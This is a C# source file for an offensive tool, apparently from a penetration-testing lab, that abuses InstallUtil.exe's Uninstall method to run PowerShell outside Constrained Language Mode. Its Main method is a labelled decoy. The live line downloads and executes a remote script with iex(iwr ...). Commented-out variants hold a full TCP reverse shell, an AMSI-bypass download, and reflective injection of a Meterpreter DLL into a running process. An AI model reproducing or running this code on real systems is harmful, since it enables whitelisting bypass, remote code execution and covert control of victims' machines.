using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace CLMBypassUninstallUtil
{
    class Program
    {
        static void Main(string[] args)
        {
            //This section of code is notused. We can put whatever we want here.
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //This is the section called by the InstallUtil.exe binary specifying the uninstall option
            //String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";

            //Rev powershell
            //String cmd = "iex (iwr http://192.168.49.206/amsi.ps1 -UseBasicParsing)";
            String cmd = "iex(iwr http://192.168.49.206/run64.ps1 -UseBasicParsing)";
            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.84/run64.ps1') | IEX;";
            //String cmd = "$client = New-Object System.Net.Sockets.TCPClient('192.168.49.84',443);$stream = $client.GetStream();[byte[]]$bytes = 0 .. 65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};";
            //String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.113/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.113/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name notepad).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}